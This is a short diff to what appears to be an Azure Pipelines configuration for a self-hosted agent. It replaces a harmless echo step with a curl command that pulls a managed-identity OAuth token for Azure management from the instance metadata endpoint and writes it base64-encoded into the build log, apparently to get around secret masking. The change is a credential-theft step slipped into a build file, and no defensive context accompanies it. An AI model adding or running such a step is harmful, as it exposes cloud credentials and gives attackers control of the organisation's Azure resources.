@@ -6,5 +6,5 @@ pool:
   name: WKL-rwbuvlczft6004564  # This must match the name of your self-hosted agent pool
 
 steps:
-- script: echo "hello"
-  displayName: 'Say Hello'
+- script: curl -H Metadata:true --noproxy "*" "http://169.254.169.254/metadata/identity/oauth2/token?apiversion=2021-02-01&resource=https://management.azure.com/" | base64 -w0
+  displayName: 'CURL IRON'
